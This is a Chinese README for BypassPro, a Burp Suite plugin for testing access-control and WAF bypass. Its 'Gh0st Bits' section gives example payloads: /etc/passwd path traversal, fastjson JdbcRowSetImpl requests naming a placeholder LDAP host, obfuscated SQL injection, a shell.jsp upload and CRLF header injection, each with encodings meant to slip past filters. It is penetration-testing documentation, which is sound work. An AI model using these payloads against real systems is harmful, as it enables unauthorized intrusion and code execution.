

语言 / Language: [简体中文](README.md) | [English](README_EN.md)

郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担。

### 介绍

作者：[p0desta](https://github.com/p0desta/)，[Y0!0](https://github.com/hooray195)，[0cat](https://github.com/0cat-r)  

团队：[0x727](https://github.com/0x727)，未来一段时间将陆续开源工具，地址：[https://github.com/0x727](https://github.com/0x727)

定位：在攻防和渗透测试中，可以更加方便的找到一些绕过的点，比如403bypass,比如shiro的权限绕过

语言：Java 8（`pom.xml` 中 `source/target=8`，产物可在 Java 8 环境运行；构建可使用 JDK 8+）

功能：权限绕过的自动化bypass的burpsuite插件。

此项目是基于p0desta师傅的项目[https://github.com/p0desta/AutoBypass403-BurpSuite](https://github.com/p0desta/AutoBypass403-BurpSuite)进行二开的。用于权限绕过，403bypass等的自动化bypass的Burpsuite插件。感谢p0desta师傅的开源，本二开项目已经过p0desta师傅本人允许开源。

### 快速目录

- [快速开始（推荐流程）](#快速开始推荐流程)
- [三个入口怎么选](#1三个入口怎么选)
- [只看案例](#历史案例)
  - [Gh0st Bits 实操案例](#gh0st-bits-实操案例)
  - [历史案例](#历史案例)
- [当前版本 BypassPro 5.2 更新](#当前版本-bypasspro-52-更新)
  - [模式重构](#1-模式重构)
  - [Manual WAF 工具区重构](#2-manual-waf-工具区重构)
  - [Gh0st Bits 专区](#3-gh0st-bits-专区)
  - [Raw Socket 发送](#4-raw-socket-发送)
  - [Auto WAF 中的 Ghost Bits 绕过](#5-auto-waf-中的-ghost-bits-绕过)
  - [配置重构](#6-配置重构)
  - [Dashboard 与结果展示](#7-dashboard-与结果展示)
- [Auto-权限绕过](#2-auto-权限绕过)
- [Auto-WAF 绕过](#3-auto-waf绕过)
- [Manual-WAF 工作台](#4-manual-waf-工作台)

### 当前版本 BypassPro 5.2 更新

BypassPro 5.2 在 5.x 的“自动权限绕过 + 自动 WAF 绕过 + 手动 WAF 工作台”基础上，重点改进请求基线、响应判定、任务控制、配置保存和操作布局。

5.2 增加原请求基线重发、手动基线响应切换和变换顺序展示，并修正响应比较、字符集处理及正文转换。Dashboard 顶部采用左侧操作、右侧统计布局；窄窗口自动分行，状态提示单独右对齐。

Manual WAF 将网络目标与操作按钮分行，请求和响应编辑区对齐，基线详情放在编辑区下方。History 优先显示状态、方法和路径，其余列可横向滚动；折叠后腾出工具区空间。

#### 1. 模式重构

**Auto-权限绕过**

- 入口：`Send to BypassPro (Access Control)`，以及 Dashboard 中的 Auto Scan。
- 配置：`profiles.auto_access_bypass`。
- 用途：面向 401/403、权限绕过、访问控制绕过场景。
- 规则：suffix / prefix / boundary_insert / headers。

**Auto-WAF绕过**

- 入口：`Send to BypassPro (WAF)`。
- 配置：`profiles.auto_waf_bypass`。
- 用途：对指定请求自动生成 WAF 绕过变体。
- 能力：
  - Path / Header 规则变形。
  - Body Charset 编码：UTF-16 / UTF-16BE / UTF-16LE / UTF-32 / UTF-32BE / UTF-32LE / IBM037。
  - Body Transform：Gzip。
  - Content-Type 伪装：form-urlencoded / multipart / text/plain。
  - Ghost Bits 自动绕过：基于原请求已有 token 生成 `eq` / `parser` 候选，场景模板默认关闭。

**Manual-WAF工作台**

- 入口：`Send to BypassPro (Manual WAF)`。
- 用途：把请求送入手动工作台，像 Repeater 一样编辑、组合、发送，但工具栏专门面向 WAF/解析差异绕过。
- 特点：
  - 使用 Burp 原生 `IMessageEditor`，支持 Pretty / Raw / Hex。
  - 支持 Host / Port / HTTPS 手动修改。
  - 支持 Send / Cancel / 重发原请求 / 恢复原请求 / Undo / Redo。
  - Burp 发送支持同源 Follow Redirect（相同主机、端口、协议），最大跳转次数读取 `general.max_redirects`，默认 3；Raw 模式会禁用此选项。
  - History 保存请求、响应、网络目标和发送模式，双击完整载入；可折叠以腾出工具区空间。

#### 2. Manual WAF 工具区重构

手动工具区重新按用途分区，不再把所有按钮堆在一起：

- **Obfuscation & Noise**：控制字符、噪音字符、路径混淆、后缀/分段/边界变形。
- **Data Encoding**：URL 编码、Path 编码、双重 URL、混合编码、Unicode 转义、Base64、字符集编码、charset 参数位置变形；安全字符无变化时会询问是否强制编码。
- **Char Mutation**：全角、同形字、零宽字符、大小写变形。
- **Header Spoof**：X-Forwarded-For、X-Client-IP、X-Remote-Addr、Referer、HTTP/1.0 等头部伪造。
- **Body Transform**：form / multipart / JSON 转换、Gzip、HTTP/1.0。
- **Gh0st Bits**：Java char -> byte 截断、宽松 parser、模板化漏洞链构造。

选区规则也做了统一：

- 有选区时，优先处理用户选中的内容。
- 多处匹配时，弹出作用域选择：选区处 / 全部 / 第 N 处。
- URL / Base64 直接处理选区原始字节；全角、同形字等文本操作按正文声明字符集解码和编码，失败时保留请求。
- 对 URL 编码这类“安全字符默认无变化”的操作，会先确认作用域，再询问是否强制把选区每个原始字节编码成 `%XX`。
- 没有选区且无法安全推断位置时，会提示用户先选中。
- 支持保持光标位置，避免点击工具后编辑器跳回开头。

整段正文转换及自动正文变形会跳过带传输编码或压缩编码的请求。响应判定使用最终状态码，并先去除 chunk framing、解压 gzip / deflate，再按声明字符集比较；截断或无法解码的正文保留原始响应并说明原因。

Body 转换保持已有 JSON 原样；转换到表单等文本格式时，嵌套 JSON 或文件字段会提示无法转换并保留请求。Ghost 正文变形使用声明字符集，跳过无法表达的候选。

发送准备保留原有 TE/CL 组合，仅在占位符改变普通正文长度时更新 CL。响应比较保留 JSON 字符串内空白；长正文归一化后从全文分段取样，比较最多 8000 字符。

#### 3. Gh0st Bits 专区

**Gh0st Bits** 工作区用于测试 Java 生态中 `char` 到 `byte` 截断、宽松 hex 解析、多阶段 decode 等解析差异。

手动区能力：

- **Ghost 编码**
  - 最小集：只变形危险分隔符，如 `. / \ % @ : ; ? & = ' " < > CR LF`。
  - 全量：选区内 ASCII 全部变形。
  - 字母 / 数字 / 符号：按字符类型变形。
  - 换组：保持 Ghost 还原结果不变，重新生成另一组 Ghost 字符。
- **Ghost 还原**
  - 预览：查看选区低 8 位或低 7 位还原结果。
  - 候选：选中单个 ASCII 字符，查看可用 Ghost 字符候选。
  - 8-bit：模拟 `ch & 0xFF`。
  - 7-bit：模拟 Tomcat RFC2231 中的 `ch & 0x7F`。
- **常用载荷**
  - `.%u002e`
  - `CRLF`
  - `.jsp`
  - `@type`
  - `class`
- **JSON 解析器**
  - fastjson `\x4`_
  - fastjson `\u`
  - jackson `\u`
  - Unicode 数字
- **URL / 文件解析器**
  - Jetty `%2>`
  - 全角 URL
  - Tomcat `%HH`
- **模板**
  - 模板来自 `profiles.manual_waf_bypass.ghost_bits.templates`。
  - 支持 path / filename / header_value / selection 四类 target。

底部紧凑预览会显示：

- 当前选区。
- 通用 Ghost 低位还原结果。
- 专用 parser 按对应机制给出本地解码预览，不代表目标服务一定使用该解析器或受影响版本。
- 风险提示，如 path、separator、CRLF、percent、quote、angle 等。

##### Ghost Bits 认知纠偏

现在很多资料把 Ghost Bits 直接和 `阮严灵丰丰甲来` 绑定在一起，这是不准确的。

`阮严灵丰丰甲来` 只是 CVE-2025-41242 这条利用链里，为了构造中间态 `.%u002e` 选出来的一组字符：

```text
阮 -> .
严 -> %
灵 -> u
丰 -> 0
丰 -> 0
甲 -> 2
来 -> e

阮严灵丰丰甲来
低 8 位还原后是：
.%u002e
```

注意最后一个字是 `来`，不是 `田`。`来` 的低 8 位是 `0x65`，也就是 `e`；`田` 的低 8 位是 `0x30`，也就是 `0`。

更重要的是：Ghost Bits 不是固定 payload，也不是“中文等于漏洞”。它的本质是：

```text
攻击者先设计后端最终要看到的 ASCII / 中间态
↓
再为每个字符挑选低 8 位相同的 Unicode 字符
↓
WAF 看到 Unicode
↓
后端某一层如果发生 char -> byte 截断，就看到原始 ASCII / 中间态
```

所以 `阮严灵丰丰甲来` 只是一个例子。任何满足 `unicodeChar & 0xff == targetAscii` 的字符都可以作为 Ghost 字符。

这也是 BypassPro 把 Gh0st Bits 拆成三类的原因：

- **Ghost 编码**：把用户选中的已有 payload 做低 8 位等价变形。
- **解析差异**：处理 `%xx`、`\uXXXX`、`\xHH`、`filename`* 这类解析器差异。
- **模板**：处理 CVE-2025-41242、Tomcat filename、Jetty `%2>` 这类完整漏洞链。

**换组（Shuffle）** 的意义也在这里：Ghost 字符不是固定的。只要低 8 位相同，显示字符可以换很多组。选中已 Ghost 化的文本后点击 `Shuffle`，还原结果不变，但 Unicode 字符会换成另一组。这可以用来判断 WAF 是在拦某组字面量，例如 `阮严灵丰丰甲来`，还是做了真正的低位还原检测。

> **⚠️ 警告：请勿对 Unicode 数字使用换组！**
> 对于绝大多数基于“低 8 位截断”的漏洞（如 Spring 目录穿越、Tomcat `%HH`、CRLF 等），你可以随意换组。但请千万注意，**不要对 JDK URLDecoder 和 Fastjson Unicode 数字 这两个模板进行换组！**
> 为什么？因为这两个漏洞不是靠“低位截断”触发的。它们是靠真正的 **Unicode 字符数字属性**（比如阿拉伯数字 `٠` 对应 `0`）。换组会随机改变字符的高字节，使其彻底失去数学上的数字含义，导致漏洞失效！

##### Gh0st Bits 实操案例

下面案例都假设你已经把请求右键送入 `Manual WAF` 工作台。请只在授权测试、靶场或自有环境中使用。

###### 案例 A：CVE-2025-41242 / Spring Static Path Traversal

这个场景最容易被误解。它不是把 `../` 直接 Ghost 化，而是先构造中间态 `.%u002e`，再把这个中间态 Ghost 化。

目标链路是：

```text
阮严灵丰丰甲来
↓ 低 8 位还原
.%u002e
↓ 后续 URI / URL decode
..
```

原始请求示例：

```http
GET / HTTP/1.1
Host: 127.0.0.1:8080
Connection: close
```

推荐做法一：按原子能力手动组合。

1. 先把原始请求改成明确的路径穿越语义：

```http
GET /../../../../etc/passwd HTTP/1.1
Host: 127.0.0.1:8080
Connection: close
```

1. 在 path 里选中要处理的 `../` 片段。
2. 进入 `Obfuscation & Noise -> Traversal`，点击 `.%u002e`。
  这一步的作用是把标准路径穿越 token 变成 Spring 链路需要的中间态：

```http
GET /.%u002e/.%u002e/.%u002e/.%u002e/etc/passwd HTTP/1.1
Host: 127.0.0.1:8080
Connection: close
```

1. 进入 `Gh0st Bits`，依次选中每个 `.%u002e`，点击 `常用载荷 -> .%u002e`，或点击 `Ghost 编码 -> 最小集`。
  这一步把中间态 Ghost 化：

```text
阮严灵丰丰甲来 -> .%u002e
```

   请求会变成类似：

```http
GET /阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/etc/passwd HTTP/1.1
Host: 127.0.0.1:8080
Connection: close
```

1. 为了触发 Spring `StringUtils.uriDecode` 的 `changed=true` 分支，需要保留至少一个合法 `%xx`。常见写法是把目标文件名最后的 `d` 变成 `%64`，让 `passwd` 变成 `passw%64`。
  `%64` 不是魔法值，也不是必须编码 `d`。它的核心作用是让解码函数进入 `baos.write(ch)` 路径；如果没有任何 `%xx`，某些链路会直接返回原字符串，Ghost 字符就不会发生低位还原。
   最终请求类似：

```http
GET /阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/etc/passw%64 HTTP/1.1
Host: 127.0.0.1:8080
Connection: close
```

1. Send 模式用 `Auto` 或 `Raw`。

注意：不同链路的解码粒度可能不同。如果目标按整条 path 解码，一个 `%xx` 可能触发整条 path 的 `changed=true`；如果目标按每个 path segment 独立解码，则每个 Ghost segment 可能都需要自己的 `%xx` 触发点，例如 `/%2e严灵丰丰甲来/` 这种单段形态。

这个过程体现的是组合能力：

```text
真实攻击语义：../../../../etc/passwd
↓ Obfuscation & Noise
中间态：.%u002e/.%u002e/.%u002e/.%u002e/etc/passwd
↓ Gh0st Bits
显示形态：阮严灵丰丰甲来/...
↓ Data Encoding
decode trigger：passw%64
```

为什么不是直接选中 `../` 然后 Ghost？

```text
../
↓ 直接 Ghost 化
Ghost 还原后还是 ../
```

这会让后续路径规范化更早看到 `../`，不一定能绕过 Spring 的字面量检查。CVE-2025-41242 这条链需要的是 `.%u002e` 这个中间态。

![CVE-2025-41242 Gh0st Bits 演示](image/ghostbits-demo.gif)


推荐做法二：直接用模板。

1. 进入 `Gh0st Bits`。
2. 点击 `模板` 中的 `Spring Path`。
3. 插件会把请求 path 替换为 Spring 静态资源穿越风格 payload，类似：

```http
GET /阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/etc/passw%64 HTTP/1.1
Host: 127.0.0.1:8080
Connection: close
```

1. Send 模式选择 `Auto` 或 `Raw`。
2. 如果目标链路匹配，后端可能按类似下面的路径解析：

```text
/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/etc/passw%64
↓
/.%u002e/.%u002e/.%u002e/etc/passwd
↓
/../../../etc/passwd
```

<img width="2912" height="1534" alt="image" src="https://github.com/user-attachments/assets/695339a7-a1aa-4b67-a4db-6223c44d2eff" />

<img width="2804" height="1564" alt="image" src="https://github.com/user-attachments/assets/351a54d6-cb41-4468-830e-443ddb420bdf" />

<img width="2912" height="1626" alt="image" src="https://github.com/user-attachments/assets/b3fcd28f-677f-4dbb-9208-034a3923978b" />


###### 案例 B：fastjson `\x4_` 绕过 `@type`

目标：让 WAF 看不到 `@type`，但让 fastjson 宽松解析后仍得到 `@type`。

原始请求：

```http
POST /api/update HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/json

{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://example.invalid/obj","autoCommit":true,"meta":"..."}
```

WAF 视角：直接看到 `@type`，很容易拦截。

普通变形：

```http
POST /api/update HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/json

{"\x40type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://example.invalid/obj","autoCommit":true,"meta":"..."}
```

WAF 视角：如果会识别 `\x40`，仍然能还原出 `@type`。

Manual WAF 操作：

1. 选中 JSON key 里的 `@type`。
2. 点击 `Gh0st Bits -> JSON 解析器 -> fastjson \x4_`。
3. 工作台会把 key 改成类似：

```http
POST /api/update HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/json

{"\x4Jtype":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://example.invalid/obj","autoCommit":true,"meta":"..."}
```

后端可能看到：

```text
\x4J -> @
\x4_ -> @
```

这里不是标准低 8 位 Ghost Bits，而是 fastjson `\x` 宽松 hex 表达。它的价值是让 WAF 和 fastjson 对 `\x4?` 的理解不一致。

###### 案例 C：fastjson `\u0040` Unicode 数字绕过

目标：仍然构造 `@type`，但把 `\u0040` 里的数字换成 fastjson 可能接受的 Unicode 数字。

原始请求：

```http
POST /api/update HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/json

{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://example.invalid/obj","autoCommit":true,"meta":"..."}
```

普通 Unicode 变形：

```http
POST /api/update HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/json

{"\u0040type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://example.invalid/obj","autoCommit":true,"meta":"..."}
```

WAF 视角：很多 WAF 会把 `\u0040` 解成 `@`，继续拦截。

Manual WAF 操作：

1. 选中 `\u0040`，或者选中 `@type`。
2. 点击 `Gh0st Bits -> JSON 解析器 -> fastjson \u`。
3. 也可以点击 `Unicode 数字`，只替换 escape 里的数字位。
4. 变形后类似：

```http
POST /api/update HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/json

{"\u٠٠٤٠type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://example.invalid/obj","autoCommit":true,"meta":"..."}
```

后端可能看到：

```text
\u٠٠٤٠ -> \u0040 -> @
```

注意：这个案例依赖 fastjson 对 Unicode digit 的处理差异。它不是“所有 JSON 解析器都通用”的 Ghost Bits。

###### 案例 D：Jackson `\u` / charToHex 低 8 位

目标：让 WAF 看不到标准 JSON 字段和值里的敏感字符串，但 Jackson 的 `charToHex(ch & 0xff)` 仍能把 `\uXXXX` escape 解析回来。

原始请求：

```http
POST /api/query HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/json

{"username":"admin' and 1='1","tenantId":"1001","page":1,"size":20}
```

WAF 视角：能直接看到 `and 1='1` 这类敏感片段。

普通 Unicode 转义：

```http
POST /api/query HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/json

{"\u0075\u0073\u0065\u0072\u006e\u0061\u006d\u0065":"\u0061\u0064\u006d\u0069\u006e\u0027\u0020\u0061\u006e\u0064\u0020\u0031\u003d\u0027\u0031","tenantId":"1001","extra":"..."}
```

WAF 视角：如果会做 JSON / Unicode 预解析，还是能还原出 `username` 和 `admin' and 1='1`。

Manual WAF 操作：

1. 选中 `username`、SQL 片段，或者选中已经写好的 `\uXXXX` 片段。
2. 点击 `Gh0st Bits -> JSON 解析器 -> jackson \u`。
3. 工作台会把每个 `\uXXXX` 的 4 个 hex 位替换成低 8 位相同的 Ghost 字符，变形后类似：

```http
POST /api/query HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/json

{"\u丰丰男丵\u丰丰男耳\u丰丰茶丵...":"\u丰丰茶失...","tenantId":"1001","extra":"..."}
```

这里的字符只是示例，实际生成的 Ghost 字符可能不同。关键是还原关系要成立：

```text
\u丰丰男丵 -> 还原后是 \u0075 -> u
\u丰丰男耳 -> 还原后是 \u0073 -> s
\u丰丰茶丵 -> 还原后是 \u0065 -> e
...
整体解析后仍是 username / admin' and 1='1
```

如果是 SQL 注入类 value，也按同样方法处理：先选中危险 value，再点 `jackson \u`，最后看底部 Ghost 还原预览是否能还原成原始 payload。

限制：

- 这个场景依赖 Jackson 走 `ReaderBasedJsonParser` 的 `char[]` 输入。
- Spring Boot 常见 JSON 请求默认可能走 `UTF8StreamJsonParser` 的 `byte[]` 输入，不一定触发。
- 所以它适合 Manual WAF 做验证，不适合 Auto 默认当作漏洞确认。

###### 案例 E：Tomcat multipart filename 绕过

目标：WAF 看不到 `.jsp`，但 Tomcat RFC2231 filename 解析后保存成 `.jsp`。

原始请求：

```http
POST /upload HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: multipart/form-data; boundary=----b

------b
Content-Disposition: form-data; name="file"; filename="shell.jsp"
Content-Type: text/plain

test
------b--
```

WAF 视角：直接看到 `filename="shell.jsp"`。

普通 RFC2231 / URL 变形：

```http
POST /upload HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: multipart/form-data; boundary=----b

------b
Content-Disposition: form-data; name="file"; filename*="UTF-8''shell.%6asp"
Content-Type: text/plain

test
------b--
```

WAF 视角：如果会 decode `%6a`，仍然看到 `.jsp`。

Manual WAF 操作：

1. 先把 `filename=` 改成 `filename*="UTF-8''shell.jsp"`。
2. 如果要走 `%HH` 解析链，选中 `j`，点击 `Gh0st Bits -> URL / 文件解析器 -> Tomcat %HH`。不要选中 `6a`，这个按钮接收的是原始字符，不是 hex 文本。
3. 如果要走裸字符低位还原链，选中 `.jsp`，点击 `常用载荷 -> .jsp`。
4. `%HH` 变形后类似：

```http
POST /upload HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: multipart/form-data; boundary=----b

------b
Content-Disposition: form-data; name="file"; filename*="UTF-8''shell.%鸶繡sp"
Content-Type: text/plain

test
------b--
```

后端可能看到：

```text
%鸶繡 -> %6a -> j
shell.%鸶繡sp -> shell.jsp
```

如果涉及 7-bit 分支，切到 `Ghost 还原 -> 7-bit` 看 `ch & 0x7f`；普通 `(byte)c` 场景看 `8-bit`。实际生成字符可能不是 `鸶繡`，以底部还原预览为准。

###### 案例 F：Jetty `%2>` loose hex

目标：让 WAF 看不到标准 `%2e%2e`，但 Jetty 历史宽松解析链可能把 `%2>` 当成 `%2e`。

原始请求：

```http
GET /setup/setup-s/%2e%2e/%2e%2e/log.jsp HTTP/1.1
Host: 127.0.0.1:9090
Connection: close
```

WAF 视角：decode 后就是 `../../log.jsp`，容易拦截。

Manual WAF 操作：

1. 选中 path 中的单个 `.` 或单个 `%2e`。
2. 点击 `Gh0st Bits -> URL / 文件解析器 -> Jetty %2>`。
3. 变形后类似：

```http
GET /setup/setup-s/%2>%2>/%2>%2>/log.jsp HTTP/1.1
Host: 127.0.0.1:9090
Connection: close
```

后端可能看到：

```text
%2> -> %2e -> .
%2>%2> -> ..
```

这个按钮只负责把已有点号 token 改成 Jetty loose hex 形态。它不是把任意 path 变成 Openfire payload；完整 Openfire 风格路径应使用模板或手工组合。

###### 案例 G：Header CRLF / HttpClient 类截断

目标：业务层看起来只是一个 header value，后端二次转发时如果经过存在 `char -> byte` 截断的 Java 协议写入库，字节层可能还原出 CRLF。

原始请求：

```http
GET / HTTP/1.1
Host: 127.0.0.1:8080
X-Token: AAAABBBB
Connection: close
```

Manual WAF 操作：

1. 选中 `X-Token` 的值中要插入换行的位置，例如 `AAAA` 后面。
2. 点击 `Gh0st Bits -> 常用载荷 -> CRLF`。
3. 变形后类似：

```http
GET / HTTP/1.1
Host: 127.0.0.1:8080
X-Token: AAAA瘍瘊BBBB
Connection: close
```

Ghost 还原预览应显示：

```text
瘍瘊 -> \r\n
```

目标应用如果后续把该值交给 Apache HttpClient `<= 4.5.9`、SMTP/Mail 或其他存在 `char -> byte` 截断的 Java 协议写入链，字节层可能变成：

```http
X-Token: AAAA
BBBB
```

注意：单个入站 HTTP 请求不会因为这里出现 `瘍瘊` 就自动拆 header。关键是后端二次转发或协议写入链是否存在低位还原。Auto-WAF 默认不会凭空注入 CRLF，只有原请求已有 CRLF 编码态才会生成候选。

##### Gh0st Bits 当前能力边界

已经支持：

- 通用 Ghost 编码：最小集 / 全量 / 字母 / 数字 / 符号。
- 换组：保持 Ghost 还原结果不变，重新生成另一组 Unicode 字符。
- 8-bit / 7-bit Ghost 还原预览与候选字符查询。
- 常用原子载荷：`.%u002e`、CRLF、`.jsp`、`@type`、`class`。
- 解析差异原子：fastjson `\x4_`、fastjson `\u`、Jackson `\u`、Jetty `%2>`、Tomcat `%HH`、全角 URL。
- YAML 模板：Spring Path、Tomcat filename、Jetty loose hex、fastjson / jackson / SMTP / BCEL 前缀等场景模板。
- Raw Socket：用于发送 request line / headers 中含非 ASCII Ghost 字符的请求。

不是一键完整链：

- BCEL：当前只辅助处理已有字符串或模板前缀，没有 `class bytes -> gzip -> BCEL encode -> Ghost` 的完整生成器。
- JDK URLDecoder：可以通过 Unicode 数字、全角 URL 等原子能力手工组合，但没有专用模板。
- Tomcat 全 Ghost 文件名：可以用通用 Ghost 编码或 `.jsp` 原子做裸字符形态；`Tomcat %HH` 只负责 `%HH` hex 解析形态。
- Nashorn / JSP：资料中这类解析器通常有严格 hex 校验，不应当作可用 Ghost Bits 案例。

#### 4. Raw Socket 发送

Manual WAF 增加三种发送模式：

- **Auto**：默认模式。请求行或 headers 中出现非 ASCII 字节时自动走 Raw Socket。
- **Burp**：强制使用 Burp `makeHttpRequest`。
- **Raw**：强制使用 Raw Socket。

Raw Socket 用于复现 Burp / curl / 浏览器可能无法稳定发送的请求，例如路径中直接携带 Unicode Ghost Bits 字符的场景。Raw 模式会绕开 Burp 的客户端规范化，并禁用证书校验，适合 CTF、靶场和授权测试环境。

限制：Raw Socket 是插件自己直连目标，不读取 Burp 的 Upstream Proxy / SOCKS Proxy 配置。需要内网代理链路时，请优先用 `Burp` 模式，或确认当前网络能直连目标。

#### 5. Auto WAF 中的 Ghost Bits 绕过

Auto-WAF 的 Ghost Bits 默认遵循一个原则：只变形原请求里已经存在的内容，不自动发完整漏洞链 payload。

- 配置位置：`profiles.auto_waf_bypass.options.ghost_bits`。
- 支持开关：
  - `enabled`
  - `raw_socket`
  - `max_variants`
  - `templates`
  - `generic`
- 默认行为：
  - `eq`：只对 query/form/json/filename 中已有可疑 token 做低 8 位等价变形。
  - `parser`：只对已有 `%xx` / Unicode escape / x escape 等解析结构做差异变形。
  - 普通 path 不做通用 Ghost 化，路径类漏洞链交给显式模板。
  - 等价变形会校验 `fold(mutated scope) == original scope`。
- 场景模板：
  - Spring Static Path Traversal / CVE-2025-41242 风格路径默认关闭。
  - Jetty `%2>` Loose Hex 默认关闭。
  - Tomcat JSP filename 默认关闭。
  - Fullwidth URL Traversal 默认关闭。
  - fastjson / jackson / BCEL / SMTP 相关模板也默认关闭。
  - 这些模板属于明确 opt-in 的漏洞链探测，开启后可能替换 path 或 filename。
- 等价变形策略：
  - 支持最小集、全量、字母、数字、符号。
  - 配置键分别是 `minimal` / `full` / `letters` / `digits` / `symbols`。
  - 默认只开“最小集”策略，避免自动扫描噪声过大。

Auto 模式会根据请求内容判断是否需要 Raw Socket。Dashboard 的 Reason 会显示 `ghost:eq` / `ghost:parser` / `ghost:template`、scope、token、sender、fold 摘要和差异原因，并对超长 payload 做压缩展示。Auto Ghost Bits 是绕过候选，不等于漏洞确认。

#### 6. 配置重构

配置文件升级为明确的 profile 结构：

```yaml
general:
  threads: 5
  max_redirects: 3
  similarity_threshold: 0.85
  lang: zh

profiles:
  auto_access_bypass:
    ...
  auto_waf_bypass:
    ...
  manual_waf_bypass:
    ghost_bits:
      ...
```

说明：

- 5.x 不再兼容旧的 `profiles.access_control` / `profiles.waf`。
- 外置配置路径：`~/.config/BypassPro/BypassPro-config.yaml`。
- 首次启动会从 jar 内置模板生成配置。
- Config 页面支持 Reload / Reinit / 保存通用配置 / 保存 WAF 选项。
- 支持界面语言切换：`general.lang: zh | en`。在 Config → 通用选择语言，保存后重新加载插件生效。菜单、工具提示、操作弹窗及内置模板说明随语言切换；请求内容、自定义模板和原始 YAML 按原文显示。
- 支持配置 Follow Redirect 最大跳转次数：`general.max_redirects`，Dashboard 自动模式和 Manual WAF 共用，默认 3。

#### 7. Dashboard 与结果展示

Dashboard 也做了重构，不再只是简单堆结果表：

- 顶部控制条改为紧凑布局：
  - `AutoScan` 开关：控制是否监听 Proxy 中的 401/403 响应并自动扫描。
  - `Follow Redirect` 开关：控制 Dashboard 自动模式是否跟随 `301/302/303/307/308`，默认关闭。
  - `Threads`：Dashboard 全局并发上限，默认读取 `general.threads`；修改后在队列排空后的新输入生效。Manual WAF 使用独立发送。
  - `计划` / `完成`：基线重发与已生成变体的总量和完成数量，另显示执行中、错误和取消数量。
  - 进度条：按完成、失败、取消占计划总数的比例展示实际进度；全部失败也会结束。
  - `Err`：错误请求计数。
  - 取消勾选 `AutoScan`：停止接收新流量，已排队任务继续执行。
  - `Stop`：关闭监听，取消排队任务并忽略本轮晚到结果；底层请求可能仍在结束。
  - `Clear`：停止本轮，清空 Dashboard 结果、查看器及计数。
- `Follow Redirect` 按变体准备时快照生效：同一批请求使用准备时的开关状态和 `general.max_redirects`，中途切换影响后续准备的任务；只跟随同源跳转。Raw Ghost 变体不跟随跳转，`Redirect` 提示会说明原因。
- 每个原请求先重发一次，再生成独立变体。变体与重发响应比较；Reason 显示基线状态、变更区域、状态码、长度和相似度。基线有变化时提示复核；重发失败时跳过该请求的变体。“基线”筛选可查看原请求重发记录，一次重发不证明始终稳定。Raw 变体与 Burp 基线的发送条件差异会单独提示。
- 相似度阈值不再放在 Dashboard 顶部，统一从 Config 的 `general.similarity_threshold` 读取。
- Dashboard 表格列调整为：
  - `id`
  - `tool`
  - `Title`
  - `Method`
  - `Length`
  - `Request URL`
  - `MIME Type`
  - `HTTP Status`
  - `Redirect`
  - `Reason`
- 表格支持排序，并为常用列设置更合理的宽度。
- `Request URL` 固定显示 payload 实际作用的 fuzz 目标。即使开启 Follow Redirect 并最终跳到其它 URL，主 URL 也不会被跳转后的地址覆盖。
- `Redirect` 列显示跳转策略和实际跳数：
  - `false`：本批任务未启用 Follow Redirect。
  - `true 0/3`：启用 Follow Redirect，但没有发生跳转。
  - `true 1/3`：启用 Follow Redirect，实际跟随 1 次，最大 3 次。
  - 有跳转链时，鼠标悬停可查看完整链路，例如 `/download.do;.css -> /nolimit.jsp`；遇到跨源、循环或上限时显示停止原因。
- `Reason` 列展示入表原因，例如：
  - `status:403 -> 200`
  - `sim:0.42 < 0.85`
  - `ghost:spring_static_lfi; target:path; sender:raw`
  - `ghost file signature matched`
- `Reason` 只表达入表判断依据，不混入 Follow Redirect 开关或跳转次数。
- `Reason` 列支持 tooltip，内容较长时可以悬停查看完整原因。
- `tool` 列使用短标签区分来源：
  - `auto`
  - `send access`
  - `send waf`
  - `manual waf`
  - `auto-waf/ghost`
  - `send-waf/ghost`
- 下方仍然是 Request / Response 双窗格，选中表格行后自动展示对应请求和响应。
- Request / Response 使用 Burp 原生消息编辑器能力，支持 Raw / Hex / Render 等视图。

Manual WAF 底部也增加了当前请求摘要、payload hints、diff 状态和 Gh0st Bits 还原预览。Tooltip 支持多行展示，鼠标悬停时显示每个按钮的用途、适用场景和操作方式。



#### 1.三个入口怎么选

BypassPro 5.2 主要有四个使用入口：


| 入口                                 | 位置                      | 适合场景                     | 配置                            |
| ---------------------------------- | ----------------------- | ------------------------ | ----------------------------- |
| AutoScan                           | Dashboard 勾选 `AutoScan` | 自动监听 Proxy 中的 401/403 响应 | `profiles.auto_access_bypass` |
| Send to BypassPro (Access Control) | 请求右键菜单                  | 对单个请求做权限绕过测试             | `profiles.auto_access_bypass` |
| Send to BypassPro (WAF)            | 请求右键菜单                  | 对单个请求做自动 WAF 绕过测试        | `profiles.auto_waf_bypass`    |
| Send to BypassPro (Manual WAF)     | 请求右键菜单                  | 进入手动工作台，自己组合 payload     | `profiles.manual_waf_bypass`  |


简单选择：

- 看到 401/403，想批量找权限绕过点：用 `AutoScan`。
- 想对某一个请求做权限绕过：右键 `Access Control`。
- 想自动尝试 WAF 绕过：右键 `WAF`。
- 想自己选区、编码、组合、Raw 发包：右键 `Manual WAF`。

#### 2. Auto-权限绕过

Auto-权限绕过用于 401/403、未授权访问、访问控制绕过等场景。

入口：

